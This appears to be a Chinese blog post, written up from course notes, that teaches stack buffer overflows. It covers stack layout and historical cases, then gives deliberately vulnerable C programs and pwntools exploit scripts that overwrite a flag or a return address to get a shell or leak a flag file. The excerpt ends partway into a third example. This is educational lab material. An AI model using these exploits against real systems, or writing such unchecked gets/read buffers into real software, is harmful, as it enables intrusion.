@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="x-dns-prefetch-control" content="on" />
+    
+    <link rel="dns-prefetch" href="https://busuanzi.ibruce.info" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+    
+    <meta name="keywords" content="Antirain" />
+    <meta name="description" content="Antirain&#39;s blog" />
+    
+    <title>Antirain</title>
+    
+    <!-- stylesheets list from config.yml -->
+    
+    <link rel="stylesheet" href="/css/materialize.min.css" />
+    
+    <link rel="stylesheet" href="/css/main.min.css" />
+    
+    <link rel="stylesheet" href="/css/prism.css" />
+     
+    <style type="text/css">
+      html {
+        font-family: sans-serif;
+        font-weight: 300;
+      }
+      @font-face {
+        font-family: "Material Icons";
+        font-style: normal;
+        font-weight: 400;
+        src: url(/fonts/MaterialIcons-Regular.eot);
+        src: url(/fonts/MaterialIcons-Regular.woff2) format("woff2"), url(/fonts/MaterialIcons-Regular.woff) format("woff"), url(/fonts/MaterialIcons-Regular.ttf) format("truetype");
+      }
+    </style>
+    <link rel="shortcut icon" href="/images/favicon2.ico" />
+  <meta name="generator" content="Hexo 7.3.0"></head>
+  <body>
+    <div id="menu-box">
+      <a href="javascript:void(0)" id="menu" data-activates="slide-out" class="button-collapse menu"><span class="nav-btn"></span></a>
+    </div>
+    <div id="menu-outer">
+      <div id="menu-inner"><ul id="slide-out" class="side-nav" >
+    <div class="nav-header"  style="background-image: url(/images/15.jpg);background-color:#DDDDDD">
+    <div class="header-box"><img src="/images/header2.jpg" ondragstart="return false;"></div>
+    <p color=black>Antirain</p> 
+    <div class="nav-link">
+        
+        <a  href="https://github.com/AshenAshes" target="_blank"><div class="link-box github"></div></a>
+         
+        
+        <a href="mailto:aluxes@foxmail.com"><div class="link-box email"></div></a>
+        
+    </div>
+    <div class="nav-search">
+        <form id="search-form"> <!-- 搜索框相关 -->
+            <input type="text" id="local-search-input" name="q" results="0" placeholder="搜索..." class="search form-control" autocomplete="off" autocorrect="off"/>
+            <div class="nav-search-img"><i class="material-icons">search</i></div>
+        </form>
+        <div id="local-search-result"></div> <!-- 搜索结果区 -->
+        <p class='no-result'>无搜索结果</p>
+    </div>
+</div>
+    <!--Homepage-->
+
+<li class="nav-list">
+    <a href="/" target="_self">
+        <div class="nav-ico"><i class="material-icons">home</i> </div><p>主页</p>
+    </a>
+</li>
+
+<!--archives-->
+
+<li class="nav-list dropdown-btn">
+    <a  class=""  target="_self">
+        <div class="nav-ico"><i class="material-icons">assignment</i></div><p>归档</p><div class="dropdown-ico"><i class="material-icons">arrow_drop_down</i></div>
+    </a>
+</li>
+
+<ul class="dropdown-menu dropdown" >
+    <li class="nav-dropdown-list">
+        <a class="archive-link" href="/archives/2020/07/">July 2020<span class="archive-count">2</span></a></li><li class="nav-dropdown-list"><a class="archive-link" href="/archives/2020/02/">February 2020<span class="archive-count">1</span></a></li><li class="nav-dropdown-list"><a class="archive-link" href="/archives/2020/01/">January 2020<span class="archive-count">3</span></a></li><li class="nav-dropdown-list"><a class="archive-link" href="/archives/2019/05/">May 2019<span class="archive-count">1</span></a></li><li class="nav-dropdown-list"><a class="archive-link" href="/archives/1999/08/">August 1999<span class="archive-count">1</span></a>
+    </li>
+</ul>
+<!--categories-->
+
+<li class="nav-list dropdown-btn">
+    <a   class=""  target="_self">
+        <div class="nav-ico"><i class="material-icons">dashboard</i></div><p>分类</p><div class="dropdown-ico"><i class="material-icons">arrow_drop_down</i></div>
+    </a>
+</li>
+
+<ul class="dropdown-menu dropdown" >
+    <li class="nav-dropdown-list">
+        <a class="category-link" href="/categories/%E5%AD%A6%E4%B9%A0/">学习<span class="category-count">5</span></a></li><li class="nav-dropdown-list"><a class="category-link" href="/categories/%E9%9A%8F%E7%AC%94/">随笔<span class="category-count">2</span></a>
+    </li>
+</ul>
+<!--tags-->
+
+<li class="nav-list">
+    <a href="/archives" target="_self">
+        <div class="nav-ico"><i class="material-icons">bookmark</i> </div><p>标签</p>
+    </a>
+</li>
+
+<!--photo-->
+
+<!--friends-->
+
+<li class="nav-list">
+    <a href="/friends" target="_self">
+        <div class="nav-ico"><i class="material-icons">face</i> </div><p>友链</p>
+    </a>
+</li>
+
+<!--about-->
+
+
+</ul>
+</div>
+    </div>
+
+    <div id="content-outer">
+      <div id="content-inner"><article id="post">
+  <div class="post-page-title" style="background-color:#DDDDDD;background-image:url(/images/security1.jpg)" >
+    <h2>Software Security Note(1) | Buffer Overflow</h2>
+    
+    <p>
+      作者:Antirain 发布于:<time datetime="2020-07-17T22:59:07.000Z"> 2020-07-18 </time> 更新于:<time datetime="2024-07-06T13:22:44.054Z"> 2024-07-06 </time>
+      <span id="busuanzi_container_page_pv" style="display: none"> 本文总阅读量<span id="busuanzi_value_page_pv"></span>次 </span>
+    </p>
+    
+  </div>
+  <div class="post-page-content"><blockquote>
+<p>少年心性岁岁长，何必虚掷惊和慌。<br>
+皆是我曾途径路，不过两鬓雪与霜。</p>
+</blockquote>
+<span id="more"></span>
+<p>原文是几年前写的栈溢出那一节课和作业的整理，后来公司里做知识分享的时候顺便拿来用了，于是又重写了一遍，感觉重写后的更清楚，把原理和HW放在一起了。</p>
+<p>以下是原文的引言：</p>
+<p>是对这学期上的Software Security课程的一个整理，讲道理上课的时候听的不是很认真，而且感觉这门课还是很值得复盘整理一下的，于是写了这个系列的note，希望我能早点更完。一些依托于助教的虚拟机的服务器端的HW就没法复现了，可惜。</p>
+<p>这个<a target="_blank" rel="noopener" href="https://github.com/AshenAshes/Software-Security">github</a>是和这个项目一起的。</p>
+<h2 id="概念">概念</h2>
+<p>Buffer Overflow，即缓冲区溢出。在存在缓存溢出安全漏洞的计算机中，攻击者可以用超出常规长度的字符数来填满一个域，通常是内存区地址。在某些情况下，这些过量的字符能够作为“可执行”代码来运行。从而使得攻击者可以不受安全措施的约束来控制被攻击的计算机。</p>
+<p>C语言中存在很多有安全漏洞的库函数，由于不进行边界检查，存在着buffer overflow的风险：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//buffer overflow</span>
+    <span class="token function">strcat</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//buffer overflow</span>
+    <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment">//buffer overflow</span>
+    <span class="token function">fgets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> badfile<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//buffer overflow</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>以上是一些典型的会造成buffer overflow的例子。</p>
+<h2 id="历史上的一些Buffer-Overflow攻击">历史上的一些Buffer Overflow攻击</h2>
+<h3 id="Morris蠕虫">Morris蠕虫</h3>
+<p>1988年，美国康奈尔大学一年级研究生罗伯特·莫里斯编写了一个只有99行的程序，它利用了Unix系统中的缺点，用Finger命令查联机用户名单，然后破译用户口令，用Mail系统复制、传播本身的源程序，再编译生成代码。这次攻击造成了当时数千台计算机瘫痪，损失近亿美元。</p>
+<p>Morris蠕虫利用到了当时finger进程的一个漏洞，finger命令用来查找并显示用户信息，系统管理员通过使用该命令可以知道某个时候到底有多少用户在使用这台Linux主机。当时，用于进行finger服务的远程计算机进程,使用了标准C库函数<strong>gets</strong>。gets函数的作用是从输入流中读入一个字符串，但是gets()函数并不检查缓冲区的空间，事实上它也无法检查缓冲区的空间。如果函数的调用者提供了一个指向堆栈的指针，并且gets函数读入的字符数量超过了缓冲区的空间，gets()函数就会将多出来的字符继续写入到堆栈中,这就覆盖了堆栈原先的内容。</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//finger进程包含下列代码</span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">char</span> line<span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    …
+    <span class="token function">gets</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//会造成buffer overflow</span>
+    …
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>通过覆盖堆栈的内容，攻击者可以借此植入恶意代码并改变程序的控制流，使得其开始执行恶意代码。Morris蠕虫通过这种方式获得shell权限并替代正在运行的程序，然后向网络中的其他计算机继续发起finger请求，以感染其他更多的计算机。</p>
+<h3 id="Heartbleed漏洞">Heartbleed漏洞</h3>
+<p>Heartbleed(心脏出血)，是一个出现在加密程序库OpenSSL的安全漏洞，该程序库广泛用于实现互联网的传输层安全（TLS）协议。它于2012年被引入了软件中，2014年4月首次向公众披露。只要使用的是存在缺陷的OpenSSL实例，无论是服务器还是客户端，都可能因此而受到攻击。此问题的原因是在实现TLS的heartbeat请求时没有对输入进行适当验证（缺少边界检查）。</p>
+<p>Heartbleed漏洞，这项严重缺陷(CVE-2014-0160)的产生是由于未能在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存内容，这样一来受害者的内存内容就会以每次64KB的速度进行泄露。</p>
+<p>良性请求:</p>
+<p><img src="/2020/07/18/SoftwareSecurity1/1720268910844.png" alt=""></p>
+<p>恶性请求：</p>
+<p><img src="/2020/07/18/SoftwareSecurity1/1720268920310.png" alt=""></p>
+<h2 id="基础知识">基础知识</h2>
+<p>我们一般通过覆盖栈内存来利用buffer overflow进行attack。先讲一些涉及到的基础知识。</p>
+<h3 id="程序内存布局">程序内存布局</h3>
+<p>一个程序的内存布局及其存放内容：</p>
+<p>(高地址)</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>Stack： 局部变量、返回地址、参数…</p>
+</li>
+<li class="lvl-2">
+<p>Heap：动态内存分配</p>
+</li>
+<li class="lvl-2">
+<p>BSS：未初始化的static/global变量</p>
+</li>
+<li class="lvl-2">
+<p>Data segment：已初始化的static/global的变量</p>
+</li>
+<li class="lvl-2">
+<p>Text segment：程序的code</p>
+</li>
+</ul>
+<p>(低地址)</p>
+<p><img src="/2020/07/18/SoftwareSecurity1/1720264601532.png" alt="" width="300"></p>
+<h3 id="栈内存布局">栈内存布局</h3>
+<p>这样的程序：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">int</span> x<span class="token punctuation">,</span> y<span class="token punctuation">;</span>
+    x<span class="token operator">=</span>a<span class="token operator">+</span>b<span class="token punctuation">;</span> y<span class="token operator">=</span>a<span class="token operator">-</span>b<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">func</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>main调用函数func时，栈会为此次函数调用在栈顶分配一块内存，依次压入：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>Arguments 参数，从右往左</p>
+</li>
+<li class="lvl-2">
+<p>Return address 函数的返回地址，即该函数执行完成后要执行的下一条指令的地址</p>
+</li>
+<li class="lvl-2">
+<p>Previous frame pointer(ebp) 上一个stack frame(栈帧)的帧指针</p>
+</li>
+<li class="lvl-2">
+<p>Local varibles 函数内的一些局部变量</p>
+</li>
+</ul>
+<p>如下图所示：</p>
+<p><img src="/2020/07/18/SoftwareSecurity1/1720265457189.png" alt="" width="500"></p>
+<p>对应的汇编代码：</p>
+<h3 id="Frame-Pointer帧指针">Frame Pointer帧指针</h3>
+<p>栈的生长方向是从高地址向低地址。</p>
+<p>帧指针ebp(in 32bit)，rbp(in 64bit)。</p>
+<p>frame pointer(ebp)是用来access内存域内的局部变量的，在汇编代码中，function域内的局部变量都是通过ebp+栈上偏移量来表达的(寄存器相对寻址)。</p>
+<p>因为存在嵌套调用，比如a函数调用b函数，b函数调用c函数，为了快速定位函数内部的局部变量在内存上的位置，每个函数域都有自己的ebp，在进入另一个域后需要先Push前一个域的ebp，再set自己的ebp。相当于各个函数划分stack memory为不同的stack frame，各个frame有自己的frame pointer，即ebp。</p>
+<h3 id="Stack-Pointer栈指针">Stack Pointer栈指针</h3>
+<p>栈指针esp(in 32bit)，rsp(in 64bit)。始终指向栈顶。</p>
+<p>Push pop</p>
+<h3 id="汇编指令">汇编指令</h3>
+<p>在实际汇编指令操作中，一个func被call会经历：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>push参数入栈</p>
+</li>
+<li class="lvl-2">
+<p>call func命令，然后PC跳转到func开头</p>
+</li>
+<li class="lvl-2">
+<p>push ebp(push前一个frame的ebp)</p>
+</li>
+<li class="lvl-2">
+<p>mov esp, ebp(把当前栈顶位置赋值给ebp)</p>
+</li>
+<li class="lvl-2">
+<p>一堆函数内部过程</p>
+</li>
+<li class="lvl-2">
+<p>leave命令</p>
+</li>
+<li class="lvl-2">
+<p>ret命令</p>
+</li>
+</ul>
+<p>这里涉及到了三个汇编指令,call、leave和ret。</p>
+<h4 id="call指令">call指令</h4>
+<p>包含两步操作：</p>
+<ol>
+<li class="lvl-3">
+<p>push $eip, 相当于push了return address</p>
+</li>
+<li class="lvl-3">
+<p>跳转到func的地址，即标号地址</p>
+</li>
+</ol>
+<h4 id="leave指令">leave指令</h4>
+<p>包含两步操作：</p>
+<ol>
+<li class="lvl-3">
+<p>mov $ebp, $esp(esp指向当前frame的ebp)</p>
+</li>
+<li class="lvl-3">
+<p>pop $ebp, 把previous ebp的值赋给$ebp，即是指向上一个frame的ebp，准备返回了</p>
+</li>
+</ol>
+<h4 id="ret指令">ret指令</h4>
+<p>就是pop $eip的操作，结束函数，根据return address返回</p>
+<h2 id="攻击原理">攻击原理</h2>
+<p>通过buffer overflow去overwrite栈上的return address并写入一段恶意代码，通过新的return address跳转到恶意代码起始处去执行恶意代码即可。</p>
+<p><img src="/2020/07/18/SoftwareSecurity1/1720265572567.png" alt="" width="500"></p>
+<p>恶意代码可以引用一些现成的shellcode。</p>
+<p>我们主要的工作是找到return address，如果堆栈地址是随机化的，我们可以通过暴力搜索，但一般是固定的，可以通过观察计算得到。</p>
+<p>为了简化计算，我们可以在新的return address和malicious code间插入NOP，NOP是不会被执行的并会跳到下一条指令，这样我们就不需要精确地计算malicious code的起始位置，而只需要保证我们新的return address是在malicious code前就可以了。</p>
+<p><img src="/2020/07/18/SoftwareSecurity1/1720265607952.png" alt="" width="500"></p>
+<h2 id="攻击示例">攻击示例</h2>
+<h3 id="Victim1">Victim1</h3>
+<p>Overwrite变量值来拿到shell。</p>
+<p>通过攻击改变程序的控制流。</p>
+<h4 id="源代码">源代码</h4>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//victim1.c</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">LENGTH</span> <span class="token expression"><span class="token number">256</span></span></span>
+
+<span class="token keyword">void</span> <span class="token function">hear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">char</span> flag <span class="token operator">=</span> <span class="token char">'N'</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> str<span class="token punctuation">[</span>LENGTH<span class="token punctuation">]</span><span class="token punctuation">;</span> 
+    <span class="token function">gets</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token char">'Y'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[HACKED]\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>   
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hi. Tell me something, less than %d charecters ...\n"</span><span class="token punctuation">,</span> LENGTH<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">hear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"end\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="过程">过程</h4>
+<p>栈的布局如下所示：</p>
+<p><img src="/2020/07/18/SoftwareSecurity1/1720265784412.png" alt="" width="500"></p>
+<p>所以只要溢出一个字符'Y'来覆盖'N'即可。</p>
+<h4 id="攻击脚本">攻击脚本</h4>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment">#process的作用是运行本地的程序，如果要攻击远端服务器，可以用remote(ip, port)</span>
+io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./victim1'</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">256</span><span class="token operator">+</span><span class="token string">'Y'</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment">#向程序发送内容作为输入流</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#进入交互模式</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后可以得到shell。</p>
+<p><img src="/2020/07/18/SoftwareSecurity1/1720265844815.png" alt=""></p>
+<h3 id="Victim2">Victim2</h3>
+<p>Overwrite return address.</p>
+<p>通过攻击使得程序泄露敏感信息flag。</p>
+<h4 id="源代码-2">源代码</h4>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//victim2.c</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdbool.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stddef.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"pwnable_harness.h"</span></span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">LENGTH</span> <span class="token expression"><span class="token number">256</span></span></span>
+
+<span class="token comment">//保存有敏感信息的文件,其内容为 flag&#123;e4d1cb5fe367e7803af80db0bed7f0c4&#125;</span>
+<span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> flagfile <span class="token operator">=</span> <span class="token string">"flag.txt"</span><span class="token punctuation">;</span> 
+
+<span class="token comment">/* Send the user the contents of the first flag file. */</span>
+<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">giveFlag</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">char</span> flag<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>flagfile<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>fp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">perror</span><span class="token punctuation">(</span>flagfile<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function">fgets</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[√] Your flag: %s\n"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">hear</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] Hi, Give me password! \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+    <span class="token keyword">char</span> buf<span class="token punctuation">[</span>LENGTH<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> LENGTH<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[x] Invalid Password \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">hear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="过程-2">过程</h4>
+<p>hear()里的read有LENGTH*2-LENGTH长度的溢出空间，其栈内存布局为：</p>
+<p><img src="/2020/07/18/SoftwareSecurity1/1720265950346.png" alt="" width="500"></p>
+<p>为了拿到flag文件的内容，我们的目标是去执行giveFlag()，所以用giveFlag()的地址去覆盖hear()的return address即可。</p>
+<p>通过gdb去拿到giveFlag()的地址：</p>
+<blockquote>
+<p>gdb是 Linux 平台下最常用的一款程序调试器。可以用来进行启动程序、设置断点、单步调试、查看变量、反汇编等操作。</p>
+</blockquote>
+<p><img src="/2020/07/18/SoftwareSecurity1/1720265968586.png" alt=""></p>
+<p>可以看到giveFlag函数在内存的起始地址是0x080486a6。</p>
+<p>buffer的长度256+ebp的4字节+new return address构造payload，因为对buf有长度检查，所以前面要插入一个'\0'。这样去构造即可。</p>
+<h4 id="攻击脚本-2">攻击脚本</h4>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./victim2'</span><span class="token punctuation">)</span>
+
+<span class="token comment">#p32的作用是将一个数字转换为字符，0x080486a6会被转换为'\xa6\x86\x04\x08'，倒序是因为linux程序是小端规则的</span>
+payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">+</span> <span class="token string">'\0'</span> <span class="token operator">+</span> <span class="token number">258</span><span class="token operator">*</span><span class="token string">'A'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x080486a6</span><span class="token punctuation">)</span> 
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>结果长这样：</p>
+<p><img src="/2020/07/18/SoftwareSecurity1/1720265987142.png" alt=""></p>
+<h3 id="Victim3">Victim3</h3>
+<p>构建Stack frame。</p>
+<p>通过攻击使得程序泄露敏感信息flag。</p>
+<h4 id="源代码-3">源代码</h4>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//victim3.c</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdbool.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stddef.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"pwnable_harness.h"</span></span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">LENGTH</span> <span class="token expression"><span class="token number">256</span></span></span>
+
+<span class="token comment">//保存有敏感信息的文件,其内容为 flag&#123;c92ecee2359e0e5a41f1f0348a525417&#125;</span>
+<span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> flagfile <span class="token operator">=</span> <span class="token string">"flag.txt"</span><span class="token punctuation">;</span>
+
+<span class="token comment">/* Send the user the contents of the first flag file. */</span>
